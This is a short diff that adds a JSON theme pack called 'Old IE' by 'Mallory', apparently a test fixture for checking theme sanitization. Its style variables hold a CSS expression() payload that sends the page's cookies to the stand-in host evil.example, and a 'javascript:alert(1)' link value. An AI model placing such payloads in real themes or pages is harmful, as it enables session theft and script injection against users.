@@ -1,0 +1,8 @@
+{
+  "format": "beebo-pack", "v": 1, "kind": "theme", "id": "evil.expression", "name": "Old IE", "version": "1.0.0",
+  "author": { "name": "Mallory" }, "license": "MIT",
+  "content": {
+    "scheme": "dark", "themeColor": "#000000",
+    "vars": { "--text": "expression(document.location='https://evil.example/?'+document.cookie)", "--link": "javascript:alert(1)" }
+  }
+}
